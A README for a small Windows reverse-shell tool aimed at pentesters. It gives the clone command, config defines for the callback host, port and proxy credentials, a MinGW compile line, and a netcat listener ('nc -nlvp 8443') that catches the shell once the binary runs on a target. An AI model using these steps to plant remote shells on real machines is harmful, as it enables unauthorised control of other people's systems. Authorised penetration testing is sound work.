# rcmd (Reverse CMD)

Minimal Windows reverse shell with proxy support and not dependencies. Useful in pentesting. 

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

Windows C compiler (or cross comp). 

### Installing

Download a copy of the project from github:

```
$ git clone https://github.com/joseigbv/rcmd.git
```

Edit configuration: 

```
...
// proxy config
#define RHOST "10.0.0.1"   
#define RPORT 8080
#define AUTH "TVlET01cdXNyMToxMjM0"

// remote connect 
#define HOST "1.2.3.4"
#define PORT 8443
...
```

Compile with MinGW:

```
C:\> gcc -Wall -O2 rcmd.c -o rcmd -lwsock32
```

### Usage 

Upload rcmd and launch. Now, simply, run in your linux box: 

```
$ nc -nlvp 8443 
C:\> ...
```

## Authors

* **José Ignacio Bravo** - *Initial work* - nacho.bravo@gmail.com

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details




